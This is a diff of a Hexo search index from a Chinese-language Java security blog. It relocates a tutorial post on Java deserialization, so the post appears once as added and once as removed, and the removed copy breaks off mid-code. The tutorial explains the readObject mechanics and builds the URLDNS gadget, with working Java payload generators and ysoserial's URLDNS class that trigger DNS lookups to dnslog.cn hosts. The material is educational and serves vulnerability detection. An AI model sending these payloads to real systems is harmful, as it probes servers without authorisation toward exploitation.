@@ -1615,6 +1615,241 @@ public Object getValue() &#123;
       </tags>
   </entry>
   <entry>
+    <title>Java反序列化基础</title>
+    <url>/2023/03/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<h1 id="序列化与反序列化概念"><a href="#序列化与反序列化概念" class="headerlink" title="序列化与反序列化概念"></a>序列化与反序列化概念</h1><p>在 Java 中的序列化与反序列化，就是将一个 Java 对象当前状态以字符串（字节序列）的形式描述出来，这串字符可能被储存&#x2F;发送到任何需要的位置，在适当的时候，再将它转回原本的 Java 对象。</p>
+<p>这中间需要一个规则，规则中描述了序列化和反序列化时究竟该如何把一个对象处理成字符串，又如何把字符串变回对象，因为这一过程必须是可逆的。</p>
+<p>Java 提供了两个类 <code>java.io.ObjectOutputStream</code> 和 <code>java.io.ObjectInputStream</code> 来实现序列化和反序列化的功能，其中 ObjectInputStream 用于恢复那些已经被序列化的对象，ObjectOutputStream 将 Java 对象的原始数据类型和图形写入 OutputStream。</p>
+<p>在 Java 的类中，必须要实现 <code>java.io.Serializable</code> 或 <code>java.io.Externalizable</code> 接口才可以使用，而实际上 Externalizable 也是实现了 Serializable 接口。</p>
+<h2 id="ObjectOutputStream"><a href="#ObjectOutputStream" class="headerlink" title="ObjectOutputStream"></a>ObjectOutputStream</h2><p>ObjectOutputStream 继承的父类或实现的接口如下：</p>
+<ul>
+<li>父类 OutputStream：所有字节输出流的顶级父类，用来接收输出的字节并发送到某些接收器（sink）。</li>
+<li>接口 ObjectOutput：ObjectOutput 扩展了 DataOutput 接口，DataOutput 接口提供了将数据从任何 Java 基本类型转换为字节序列并写入二进制流的功能，ObjectOutput 在 DataOutput 接口基础上提供了 <code>writeObject</code> 方法，也就是类（Object）的写入。</li>
+<li>接口 ObjectStreamConstants：定义了一些在对象序列化时写入的常量。常见的一些的比如 <code>STREAM_MAGIC</code>、<code>STREAM_VERSION</code> 等。</li>
+</ul>
+<h2 id="ObjectInputStream"><a href="#ObjectInputStream" class="headerlink" title="ObjectInputStream"></a>ObjectInputStream</h2><p>ObjectInputStream 继承的父类或实现的接口如下：</p>
+<ul>
+<li>父类 InputStream：所有字节输入流的顶级父类。</li>
+<li>接口 ObjectInput：ObjectInput 扩展了 DataInput 接口，DataInput 接口提供了从二进制流读取字节并将其重新转换为 Java 基础类型的功能，ObjectInput 额外提供了 <code>readObject</code> 方法用来读取类。</li>
+<li>接口 ObjectStreamConstants：同上。</li>
+</ul>
+<p>ObjectInputStream 实现了反序列化功能，看一下其中的关键方法。</p>
+<h3 id="readObject"><a href="#readObject" class="headerlink" title="readObject"></a>readObject</h3><p>从 ObjectInputStream 读取一个对象，将会读取对象的类、类的签名、类的非 transient 和非 static 字段的值，以及其所有父类类型。</p>
+<p>我们可以使用 <code>writeObject</code> 和 <code>readObject</code> 方法为一个类重写默认的反序列化执行方，所以其中 <code>readObject</code> 方法会 “传递性” 的执行，也就是说，在反序列化过程中，会调用反序列化类的 <code>readObject</code> 方法，以完整的重新生成这个类的对象。</p>
+<p>#反序列化漏洞</p>
+<p>在前面提到过，一个类想要实现序列化和反序列化，必须要实现 <code>java.io.Serializable</code> 或 <code>java.io.Externalizable</code> 接口。</p>
+<p>Serializable 接口是一个标记接口，标记了这个类可以被序列化和反序列化，而 Externalizable 接口在 Serializable 接口基础上，又提供了 <code>writeExternal</code> 和 <code>readExternal</code> 方法，用来序列化和反序列化一些外部元素。</p>
+<p>其中，如果被序列化的类重写了 writeObject 和 readObject 方法，Java 将会委托使用这两个方法来进行序列化和反序列化的操作。</p>
+<p>正是因为这个特性，导致反序列化漏洞的出现：在反序列化一个类时，如果其重写了 <code>readObject</code> 方法，程序将会调用它，如果这个方法中存在一些恶意的调用，则会对应用程序造成危害。</p>
+<p>##为什么会执行readObject呢？</p>
+<p>来到<code>java.io.ObjectInputStream#readObject(java.lang.Class&lt;?&gt;)</code></p>
+<p><img src="/images/20230424205256.png"></p>
+<p><code>readObject</code>方法会调用<code>readObject0</code>方法</p>
+<p><img src="/images/20230424205507.png"></p>
+<p><code>readObject0</code>方法以字节的方式去读，当读到<code>0x73</code>，代表这是一个对象的序列化数据，将会调用 <code>readOrdinaryObject</code> 方法进行处理</p>
+<p><img src="/images/20230424205943.png"></p>
+<p><code>readOrdinaryObject</code>中会判断类是否实现了 Externalizable 接口，如果是，执行<code>readExternalData</code> 方法，不过不是，执行 <code>readSerialData</code> 方法去调用类中的<code>readObject</code> 方法。</p>
+<p><img src="/images/20230424210302.png"></p>
+<p><code>readSerialData</code> 方法先通过<code>hasReadObjectMethod</code>判断对象是否重写<code>readObject</code> 方法，如果是， 执行<code>invokeReadObject</code> 方法调用对象中的 <code>readObject</code>。</p>
+<p>序列化触发原理同理，但是一般实际环境不会去主动序列化不可信的来源。</p>
+<p>##Gadget概念</p>
+<p>一个能成功执行的反序列化调用链需要三个元素：</p>
+<ul>
+<li><strong>kick-off</strong> 入口点（重写了 readObject 的类）</li>
+<li><strong>sink</strong> （最终执行恶意动作的点：RCE…）</li>
+<li><strong>chain</strong> （中间的调用链）</li>
+</ul>
+<p>#从URLDNS理解反序列化</p>
+<p>URLDNS只依赖原生类，没有 jdk 版本限制，也被 ysoserial 涵盖在其中,所以非常适合新手来理解反序列化。它不会执行命令，只会触发 DNS 解析，因此通常用来探测是否存在反序列化漏洞.</p>
+<p>这个漏洞关键点是 Java 内置的 <code>java.net.URL</code> 类，这个类的 <code>equals</code> 和 <code>hashCode</code> 方法具有一个有趣的特性：在对 URL 对象进行比较时（使用 <code>equals</code> 方法或 <code>hashCode</code> 方法），会触发一次 DNS 解析，因为对于 URL 来说，如果两个主机名（host）都可以解析为相同的 IP 地址，则这两个主机会被认为是相同的（sink）。</p>
+<p>##<code>equals</code>方法解析</p>
+<p><code>URL#equals</code> 方法重写了 Object 的判断，调用 <code>URLStreamHandler#equals</code> 方法进行判断：<br><img src="/images/20230425112129.png"></p>
+<p><code>URLStreamHandler#equals</code> 方法判断 URL 对象是否相同，并调用 <code>sameFile</code> 方法比较两个 URL，看它们是否引用了相同的 protocol(协议)、host(主机)、port(端口)、path(路径)。</p>
+<p><img src="/images/20230425112552.png"></p>
+<p><code>sameFile</code> 方法在比较 host(主机)时，调用 <code>hostsEqual</code> 方法进行比较。</p>
+<p><img src="/images/20230425112607.png"></p>
+<p><code>hostsEqual</code> 方法调用 <code>getHostAddress</code> 方法对要比较的两个 URL 进行请求解析 IP 地址，并实施对比。</p>
+<p><img src="/images/20230425112641.png"></p>
+<p><code>getHostAddress</code> 方法使用 <code>InetAddress.getByName()</code> 方法对 host 进行解析，触发了 DNS 请求。</p>
+<p>##<code>hashCode</code>方法解析</p>
+<p><code>hashcode</code>代表对象的地址说的是对象在<strong>hash表</strong>中的位置，当在散列存储结构中确定对象的存储地址时，就会调用对象的<code>hashcode</code>方法，比如<code>HashMap</code>。URL 的 <code>hashCode</code> 方法也进行了重写，调用了 <code>URLStreamHandler#hashCode</code> 方法。在此之前有一个判断，那就是 <code>hashCode != -1</code>。</p>
+<p><img src="/images/20230425113832.png"></p>
+<p>同样是调用了 <code>getHostAddress</code> 方法对 URL 的 host 进行了解析。</p>
+<p><img src="/images/20230425113902.png"></p>
+<p>无论是使用 <code>equals</code> 方法，还是使用 <code>hashCode</code> 方法，应用程序都会解析DNS，这就是漏洞的 <strong>sink</strong> 点。</p>
+<p>接下来寻找<strong>kick-off</strong> 入口点，谁重写了<code>readObject</code>，并且<code>readObject</code>还会调用<code>equals</code>或<code>hashCode</code>方法， 那就是URLDNS gadget 的主角 —— <code>java.util.HashMap</code>。<br>HashMap的原理可以看<a href="https://cloud.tencent.com/developer/article/1167574">这篇文章</a>。</p>
+<p>我们直接看到HashMap 的 <code>readObject</code> 方法，可以看到，在<code>putVal</code>的时候会调用<code>hash</code>方法计算key对象的hash值</p>
+<p><img src="/images/20230425114513.png"></p>
+<p><code>hash</code>方法中，如果key不为空，就会调用key的<code>hashCode</code>方法,如果我们在key中传入url对象就触发DNS解析。</p>
+<p><img src="/images/20230425114637.png"></p>
+<p>这个逻辑就是 URLDNS 这条反序列化利用的 gadget 的基本原理，接下来我们测试一下，有两个需要注意的点是：</p>
+<ul>
+<li>想要让HashMap的key中有值，就需要调用HashMap的<code>put</code>方法去放入key&#x2F;value，在使用 HashMap 的 <code>put</code> 方法时，也是调用 <code>putVal</code> 方法，会对 key 进行 hash，触发解析。如果我们不想在生成 payload 时触发 DNS 解析，就要使用反射将值放进去。</li>
+<li>URL 对象有一个属性 hashCode，默认是 -1，使用<code>hashCode</code> 方法计算时会在 hashCode 属性中缓存已经计算过的值，如果再次计算将直接返回值，不会在触发 URLStreamHandler 的 <code>hashCode</code> 方法，也就不会触发漏洞。所以我们需要在生成的 HashMap 中的 URL 参数的 hashCode 值在反序列化时为 -1，而刚才说过，如果使用 put 方法，会调用一次 key 的 hash 计算，也就是 URL 的 <code>hashCode</code> 方法，这样就把 hashCode 缓存了，在反序列化时就不会触发 URLStreamHandler 的 <code>hashCode</code> 方法以及后面的逻辑。</li>
+</ul>
+<p>所以有两种思路解决这个问题：</p>
+<ul>
+<li>如果使用 HashMap 的 <code>put</code> 方法，将 URL 对象放入 Map 的 key 中之前，先将其 URL 对象 hashCode 进行修改，使其不等于 -1，这样就不会触发 DNS 查询，放入之后，再使用反射将 URL 对象中的 hashCode 修改为 -1，反序列化的时候就可以正常触发了。</li>
+<li>直接反射调用 HashMap 的 <code>putVal</code> 方法绕过 hash 计算。（由于 JDK 1.7 中方法名不一样，细节也不一样，所以不具有通用性）</li>
+</ul>
+<p>第一种思路</p>
+<pre><code>    public class URLDNS1 &#123;
+
+    public static void main(String[] args) throws Exception &#123;
+
+        HashMap&lt;URL, Integer&gt; hashMap = new HashMap&lt;&gt;();
+        URL url = new URL(&quot;http://lmz3mb.dnslog.cn&quot;);
+        Field field = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);
+        field.setAccessible(true);
+
+        field.set(url, 0x01010101);
+        hashMap.put(url, 0);
+        field.set(url, -1);
+
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;E:\\JavaSecurity\\jndi_injection\\src\\main\\resources\\urldns.bin&quot;));
+        oos.writeObject(hashMap);
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;E:\\JavaSecurity\\jndi_injection\\src\\main\\resources\\urldns.bin&quot;));
+        ois.readObject();
+    &#125;
+&#125;
+</code></pre>
+<p>第二种思路：</p>
+<pre><code>public class URLDNS2 &#123;
+
+    public static void main(String[] args) throws Exception &#123;
+
+        HashMap&lt;URL, Integer&gt; hashMap = new HashMap&lt;&gt;();
+        URL                   url     = new URL(&quot;http://su18.dnslog.cn&quot;);
+
+        Method[] m = Class.forName(&quot;java.util.HashMap&quot;).getDeclaredMethods();
+        for (Method method : m) &#123;
+            if (method.getName().equals(&quot;putVal&quot;)) &#123;
+                method.setAccessible(true);
+                method.invoke(hashMap, -1, url, 0, false, true);
+            &#125;
+        &#125;
+
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;urldns2.bin&quot;));
+        oos.writeObject(hashMap);
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;urldns2.bin&quot;));
+        ois.readObject();
+    &#125;
+&#125;
+</code></pre>
+<p>以上两种都可以触发DNS查询</p>
+<p>##ysoserial实现</p>
+<pre><code>public class URLDNS implements ObjectPayload&lt;Object&gt; &#123;
+
+        public Object getObject(final String url) throws Exception &#123;
+
+                //Avoid DNS resolution during payload creation
+                //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.
+                URLStreamHandler handler = new SilentURLStreamHandler();
+
+                HashMap ht = new HashMap(); // HashMap that will contain the URL
+                URL u = new URL(null, url, handler); // URL to use as the Key
+                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
+
+                Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); // During the put above, the URL&#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
+
+                return ht;
+        &#125;
+
+        public static void main(final String[] args) throws Exception &#123;
+                PayloadRunner.run(URLDNS.class, args);
+        &#125;
+
+        /**
+        * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
+        * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
+        * using the serialized object.&lt;/p&gt;
+        *
+        * &lt;b&gt;Potential false negative:&lt;/b&gt;
+        * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
+        * second resolution.&lt;/p&gt;
+        */
+        static class SilentURLStreamHandler extends URLStreamHandler &#123;
+
+                protected URLConnection openConnection(URL u) throws IOException &#123;
+                        return null;
+                &#125;
+
+                protected synchronized InetAddress getHostAddress(URL u) &#123;
+                        return null;
+                &#125;
+        &#125;
+&#125;
+</code></pre>
+<p> ysoserial的方法是：自定义了SilentURLStreamHandler扩展了 URLStreamHandler ，让<code>getHostAddress</code>和<code>openConnection</code>方法返回空，在初始化 URL 对象时传入，当调用HashMap的<code>put</code>方法触发hash值计算时，url对象对调用我们自定义的<code>getHostAddress</code>返回空，这样就不会触发 DNS 查询，然后在<code>put</code> 之后则是通过反射将 URL 对象的 hashCode 的值重新改为 -1。</p>
+<p>需要注意的是，为什么目标在反序列化时不会调用我们自定义的<code>getHostAddress</code>方法呢？</p>
+<p>在URL类中的<code>handler</code>属性前有个关键字<code>transient</code>,可以自定义在序列化时，把哪些属性不写入字节序列中。所以在反序列化时，目标还是会执行dns请求。</p>
+<pre><code>transient URLStreamHandler handler;
+</code></pre>
+<p>通过ysoserial的方法编写我们的测试demo：</p>
+<pre><code>public class URLDNS3 &#123;
+
+    static class SilentURLStreamHandler extends URLStreamHandler implements Serializable&#123;
+
+        protected URLConnection openConnection(URL u) throws IOException &#123;
+            return null;
+        &#125;
+
+        protected synchronized InetAddress getHostAddress(URL u) &#123;
+            return null;
+        &#125;
+    &#125;
+
+    public static void main(String[] args) throws Exception &#123;
+
+        URLStreamHandler      handler = new SilentURLStreamHandler();
+        HashMap&lt;URL, Integer&gt; hashMap = new HashMap&lt;&gt;();
+        URL                   url     = new URL(null, &quot;http://m7ful0.dnslog.cn&quot;, handler);
+        hashMap.put(url, 0);
+
+        Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);
+        f.setAccessible(true);
+        f.set(url, -1);
+
+
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;E:\\JavaSecurity\\jndi_injection\\src\\main\\resources\\urldns3.bin&quot;));
+        oos.writeObject(hashMap);
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;E:\\JavaSecurity\\jndi_injection\\src\\main\\resources\\urldns3.bin&quot;));
+        ois.readObject();
+    &#125;
+&#125;
+</code></pre>
+<p>以上就是 URLDNS 分析的全部内容了，最后总结一下。</p>
+<ol>
+<li>利用说明：</li>
+</ol>
+<ul>
+<li>通过 HashMap 的反序列化调用 URL 的 hashCode 方法发起 DNS 查询，通常用来检测反序列化漏洞的存在。</li>
+</ul>
+<ol start="2">
+<li>Gadget 总结：</li>
+</ol>
+<ul>
+<li>kick-off gadget：java.util.HashMap#readObject()</li>
+<li>sink gadget：java.net.URL#hashCode()</li>
+<li>chain gadget：无</li>
+</ul>
+<ol start="3">
+<li>优点：</li>
+</ol>
+<ul>
+<li>使用java内部的类进行构造，不依赖第三方库</li>
+<li>如果目标可以出网，在目标没有回显的时候，可以用来验证是否存在反序列化漏洞</li>
+</ul>
+]]></content>
+      <categories>
+        <category>java安全</category>
+      </categories>
+      <tags>
+        <tag>java安全</tag>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Java RMI攻击原理分析</title>
     <url>/2023/04/03/Java-RMI/</url>
     <content><![CDATA[<h1 id="RMI学习"><a href="#RMI学习" class="headerlink" title="RMI学习"></a>RMI学习</h1><h2 id="RMI详解"><a href="#RMI详解" class="headerlink" title="RMI详解"></a>RMI详解</h2><p>RMI (Remote Method Invocation) 远程方法调用，是一种调用远程位置的对象来执行方法的思想。为了屏蔽网络通信的复杂性，RMI 引入了两个概念，分别是 Stubs（客户端存根） 以及 Skeletons（服务端骨架），当客户端（Client）试图调用一个在远端的 Object 时，实际调用的是客户端本地的一个代理类（Proxy），这个代理类就称为 Stub，而在调用远端（Server）的目标类之前，也会经过一个对应的远端代理类，就是 Skeleton，它从 Stub 中接收远程方法调用并传递给真实的目标类。Stubs 以及 Skeletons 的调用对于 RMI 服务的使用者来讲是隐藏的，我们无需主动的去调用相关的方法。但实际的客户端和服务端的网络通信时通过 Stub 和 Skeleton 来实现的。<br><img src="/images/20230421212615.png"></p>
@@ -3428,241 +3663,6 @@ RMIexploit.run();
       <tags>
         <tag>java安全</tag>
         <tag>RMI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Java反序列化基础</title>
-    <url>/2023/03/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[<h1 id="序列化与反序列化概念"><a href="#序列化与反序列化概念" class="headerlink" title="序列化与反序列化概念"></a>序列化与反序列化概念</h1><p>在 Java 中的序列化与反序列化，就是将一个 Java 对象当前状态以字符串（字节序列）的形式描述出来，这串字符可能被储存&#x2F;发送到任何需要的位置，在适当的时候，再将它转回原本的 Java 对象。</p>
-<p>这中间需要一个规则，规则中描述了序列化和反序列化时究竟该如何把一个对象处理成字符串，又如何把字符串变回对象，因为这一过程必须是可逆的。</p>
-<p>Java 提供了两个类 <code>java.io.ObjectOutputStream</code> 和 <code>java.io.ObjectInputStream</code> 来实现序列化和反序列化的功能，其中 ObjectInputStream 用于恢复那些已经被序列化的对象，ObjectOutputStream 将 Java 对象的原始数据类型和图形写入 OutputStream。</p>
-<p>在 Java 的类中，必须要实现 <code>java.io.Serializable</code> 或 <code>java.io.Externalizable</code> 接口才可以使用，而实际上 Externalizable 也是实现了 Serializable 接口。</p>
-<h2 id="ObjectOutputStream"><a href="#ObjectOutputStream" class="headerlink" title="ObjectOutputStream"></a>ObjectOutputStream</h2><p>ObjectOutputStream 继承的父类或实现的接口如下：</p>
-<ul>
-<li>父类 OutputStream：所有字节输出流的顶级父类，用来接收输出的字节并发送到某些接收器（sink）。</li>
-<li>接口 ObjectOutput：ObjectOutput 扩展了 DataOutput 接口，DataOutput 接口提供了将数据从任何 Java 基本类型转换为字节序列并写入二进制流的功能，ObjectOutput 在 DataOutput 接口基础上提供了 <code>writeObject</code> 方法，也就是类（Object）的写入。</li>
-<li>接口 ObjectStreamConstants：定义了一些在对象序列化时写入的常量。常见的一些的比如 <code>STREAM_MAGIC</code>、<code>STREAM_VERSION</code> 等。</li>
-</ul>
-<h2 id="ObjectInputStream"><a href="#ObjectInputStream" class="headerlink" title="ObjectInputStream"></a>ObjectInputStream</h2><p>ObjectInputStream 继承的父类或实现的接口如下：</p>
-<ul>
-<li>父类 InputStream：所有字节输入流的顶级父类。</li>
-<li>接口 ObjectInput：ObjectInput 扩展了 DataInput 接口，DataInput 接口提供了从二进制流读取字节并将其重新转换为 Java 基础类型的功能，ObjectInput 额外提供了 <code>readObject</code> 方法用来读取类。</li>
-<li>接口 ObjectStreamConstants：同上。</li>
-</ul>
-<p>ObjectInputStream 实现了反序列化功能，看一下其中的关键方法。</p>
-<h3 id="readObject"><a href="#readObject" class="headerlink" title="readObject"></a>readObject</h3><p>从 ObjectInputStream 读取一个对象，将会读取对象的类、类的签名、类的非 transient 和非 static 字段的值，以及其所有父类类型。</p>
-<p>我们可以使用 <code>writeObject</code> 和 <code>readObject</code> 方法为一个类重写默认的反序列化执行方，所以其中 <code>readObject</code> 方法会 “传递性” 的执行，也就是说，在反序列化过程中，会调用反序列化类的 <code>readObject</code> 方法，以完整的重新生成这个类的对象。</p>
-<p>#反序列化漏洞</p>
-<p>在前面提到过，一个类想要实现序列化和反序列化，必须要实现 <code>java.io.Serializable</code> 或 <code>java.io.Externalizable</code> 接口。</p>
-<p>Serializable 接口是一个标记接口，标记了这个类可以被序列化和反序列化，而 Externalizable 接口在 Serializable 接口基础上，又提供了 <code>writeExternal</code> 和 <code>readExternal</code> 方法，用来序列化和反序列化一些外部元素。</p>
-<p>其中，如果被序列化的类重写了 writeObject 和 readObject 方法，Java 将会委托使用这两个方法来进行序列化和反序列化的操作。</p>
-<p>正是因为这个特性，导致反序列化漏洞的出现：在反序列化一个类时，如果其重写了 <code>readObject</code> 方法，程序将会调用它，如果这个方法中存在一些恶意的调用，则会对应用程序造成危害。</p>
-<p>##为什么会执行readObject呢？</p>
-<p>来到<code>java.io.ObjectInputStream#readObject(java.lang.Class&lt;?&gt;)</code></p>
-<p><img src="/images/20230424205256.png"></p>
-<p><code>readObject</code>方法会调用<code>readObject0</code>方法</p>
-<p><img src="/images/20230424205507.png"></p>
-<p><code>readObject0</code>方法以字节的方式去读，当读到<code>0x73</code>，代表这是一个对象的序列化数据，将会调用 <code>readOrdinaryObject</code> 方法进行处理</p>
-<p><img src="/images/20230424205943.png"></p>
-<p><code>readOrdinaryObject</code>中会判断类是否实现了 Externalizable 接口，如果是，执行<code>readExternalData</code> 方法，不过不是，执行 <code>readSerialData</code> 方法去调用类中的<code>readObject</code> 方法。</p>
-<p><img src="/images/20230424210302.png"></p>
-<p><code>readSerialData</code> 方法先通过<code>hasReadObjectMethod</code>判断对象是否重写<code>readObject</code> 方法，如果是， 执行<code>invokeReadObject</code> 方法调用对象中的 <code>readObject</code>。</p>
-<p>序列化触发原理同理，但是一般实际环境不会去主动序列化不可信的来源。</p>
-<p>##Gadget概念</p>
-<p>一个能成功执行的反序列化调用链需要三个元素：</p>
-<ul>
-<li><strong>kick-off</strong> 入口点（重写了 readObject 的类）</li>
-<li><strong>sink</strong> （最终执行恶意动作的点：RCE…）</li>
-<li><strong>chain</strong> （中间的调用链）</li>
-</ul>
-<p>#从URLDNS理解反序列化</p>
-<p>URLDNS只依赖原生类，没有 jdk 版本限制，也被 ysoserial 涵盖在其中,所以非常适合新手来理解反序列化。它不会执行命令，只会触发 DNS 解析，因此通常用来探测是否存在反序列化漏洞.</p>
-<p>这个漏洞关键点是 Java 内置的 <code>java.net.URL</code> 类，这个类的 <code>equals</code> 和 <code>hashCode</code> 方法具有一个有趣的特性：在对 URL 对象进行比较时（使用 <code>equals</code> 方法或 <code>hashCode</code> 方法），会触发一次 DNS 解析，因为对于 URL 来说，如果两个主机名（host）都可以解析为相同的 IP 地址，则这两个主机会被认为是相同的（sink）。</p>
-<p>##<code>equals</code>方法解析</p>
-<p><code>URL#equals</code> 方法重写了 Object 的判断，调用 <code>URLStreamHandler#equals</code> 方法进行判断：<br><img src="/images/20230425112129.png"></p>
-<p><code>URLStreamHandler#equals</code> 方法判断 URL 对象是否相同，并调用 <code>sameFile</code> 方法比较两个 URL，看它们是否引用了相同的 protocol(协议)、host(主机)、port(端口)、path(路径)。</p>
-<p><img src="/images/20230425112552.png"></p>
-<p><code>sameFile</code> 方法在比较 host(主机)时，调用 <code>hostsEqual</code> 方法进行比较。</p>
-<p><img src="/images/20230425112607.png"></p>
-<p><code>hostsEqual</code> 方法调用 <code>getHostAddress</code> 方法对要比较的两个 URL 进行请求解析 IP 地址，并实施对比。</p>
-<p><img src="/images/20230425112641.png"></p>
-<p><code>getHostAddress</code> 方法使用 <code>InetAddress.getByName()</code> 方法对 host 进行解析，触发了 DNS 请求。</p>
-<p>##<code>hashCode</code>方法解析</p>
-<p><code>hashcode</code>代表对象的地址说的是对象在<strong>hash表</strong>中的位置，当在散列存储结构中确定对象的存储地址时，就会调用对象的<code>hashcode</code>方法，比如<code>HashMap</code>。URL 的 <code>hashCode</code> 方法也进行了重写，调用了 <code>URLStreamHandler#hashCode</code> 方法。在此之前有一个判断，那就是 <code>hashCode != -1</code>。</p>
-<p><img src="/images/20230425113832.png"></p>
-<p>同样是调用了 <code>getHostAddress</code> 方法对 URL 的 host 进行了解析。</p>
-<p><img src="/images/20230425113902.png"></p>
-<p>无论是使用 <code>equals</code> 方法，还是使用 <code>hashCode</code> 方法，应用程序都会解析DNS，这就是漏洞的 <strong>sink</strong> 点。</p>
-<p>接下来寻找<strong>kick-off</strong> 入口点，谁重写了<code>readObject</code>，并且<code>readObject</code>还会调用<code>equals</code>或<code>hashCode</code>方法， 那就是URLDNS gadget 的主角 —— <code>java.util.HashMap</code>。<br>HashMap的原理可以看<a href="https://cloud.tencent.com/developer/article/1167574">这篇文章</a>。</p>
-<p>我们直接看到HashMap 的 <code>readObject</code> 方法，可以看到，在<code>putVal</code>的时候会调用<code>hash</code>方法计算key对象的hash值</p>
-<p><img src="/images/20230425114513.png"></p>
-<p><code>hash</code>方法中，如果key不为空，就会调用key的<code>hashCode</code>方法,如果我们在key中传入url对象就触发DNS解析。</p>
-<p><img src="/images/20230425114637.png"></p>
-<p>这个逻辑就是 URLDNS 这条反序列化利用的 gadget 的基本原理，接下来我们测试一下，有两个需要注意的点是：</p>
-<ul>
-<li>想要让HashMap的key中有值，就需要调用HashMap的<code>put</code>方法去放入key&#x2F;value，在使用 HashMap 的 <code>put</code> 方法时，也是调用 <code>putVal</code> 方法，会对 key 进行 hash，触发解析。如果我们不想在生成 payload 时触发 DNS 解析，就要使用反射将值放进去。</li>
-<li>URL 对象有一个属性 hashCode，默认是 -1，使用<code>hashCode</code> 方法计算时会在 hashCode 属性中缓存已经计算过的值，如果再次计算将直接返回值，不会在触发 URLStreamHandler 的 <code>hashCode</code> 方法，也就不会触发漏洞。所以我们需要在生成的 HashMap 中的 URL 参数的 hashCode 值在反序列化时为 -1，而刚才说过，如果使用 put 方法，会调用一次 key 的 hash 计算，也就是 URL 的 <code>hashCode</code> 方法，这样就把 hashCode 缓存了，在反序列化时就不会触发 URLStreamHandler 的 <code>hashCode</code> 方法以及后面的逻辑。</li>
-</ul>
-<p>所以有两种思路解决这个问题：</p>
-<ul>
-<li>如果使用 HashMap 的 <code>put</code> 方法，将 URL 对象放入 Map 的 key 中之前，先将其 URL 对象 hashCode 进行修改，使其不等于 -1，这样就不会触发 DNS 查询，放入之后，再使用反射将 URL 对象中的 hashCode 修改为 -1，反序列化的时候就可以正常触发了。</li>
-<li>直接反射调用 HashMap 的 <code>putVal</code> 方法绕过 hash 计算。（由于 JDK 1.7 中方法名不一样，细节也不一样，所以不具有通用性）</li>
-</ul>
-<p>第一种思路</p>
-<pre><code>    public class URLDNS1 &#123;
-
-    public static void main(String[] args) throws Exception &#123;
-
-        HashMap&lt;URL, Integer&gt; hashMap = new HashMap&lt;&gt;();
-        URL url = new URL(&quot;http://lmz3mb.dnslog.cn&quot;);
-        Field field = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);
-        field.setAccessible(true);
-
-        field.set(url, 0x01010101);
-        hashMap.put(url, 0);
-        field.set(url, -1);
-
-        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;E:\\JavaSecurity\\jndi_injection\\src\\main\\resources\\urldns.bin&quot;));
-        oos.writeObject(hashMap);
-        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;E:\\JavaSecurity\\jndi_injection\\src\\main\\resources\\urldns.bin&quot;));
-        ois.readObject();
-    &#125;
-&#125;
-</code></pre>
-<p>第二种思路：</p>
-<pre><code>public class URLDNS2 &#123;
-
-    public static void main(String[] args) throws Exception &#123;
-
-        HashMap&lt;URL, Integer&gt; hashMap = new HashMap&lt;&gt;();
-        URL                   url     = new URL(&quot;http://su18.dnslog.cn&quot;);
-
-        Method[] m = Class.forName(&quot;java.util.HashMap&quot;).getDeclaredMethods();
-        for (Method method : m) &#123;
-            if (method.getName().equals(&quot;putVal&quot;)) &#123;
-                method.setAccessible(true);
-                method.invoke(hashMap, -1, url, 0, false, true);
-            &#125;
-        &#125;
-
-        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;urldns2.bin&quot;));
-        oos.writeObject(hashMap);
-        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;urldns2.bin&quot;));
-        ois.readObject();
-    &#125;
-&#125;
-</code></pre>
-<p>以上两种都可以触发DNS查询</p>
-<p>##ysoserial实现</p>
-<pre><code>public class URLDNS implements ObjectPayload&lt;Object&gt; &#123;
-
-        public Object getObject(final String url) throws Exception &#123;
-
-                //Avoid DNS resolution during payload creation
-                //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.
-                URLStreamHandler handler = new SilentURLStreamHandler();
-
-                HashMap ht = new HashMap(); // HashMap that will contain the URL
-                URL u = new URL(null, url, handler); // URL to use as the Key
-                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
-
-                Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); // During the put above, the URL&#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
-
-                return ht;
-        &#125;
-
-        public static void main(final String[] args) throws Exception &#123;
-                PayloadRunner.run(URLDNS.class, args);
-        &#125;
-
-        /**
-        * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
-        * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
-        * using the serialized object.&lt;/p&gt;
-        *
-        * &lt;b&gt;Potential false negative:&lt;/b&gt;
-        * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
-        * second resolution.&lt;/p&gt;
-        */
-        static class SilentURLStreamHandler extends URLStreamHandler &#123;
-
-                protected URLConnection openConnection(URL u) throws IOException &#123;
-                        return null;
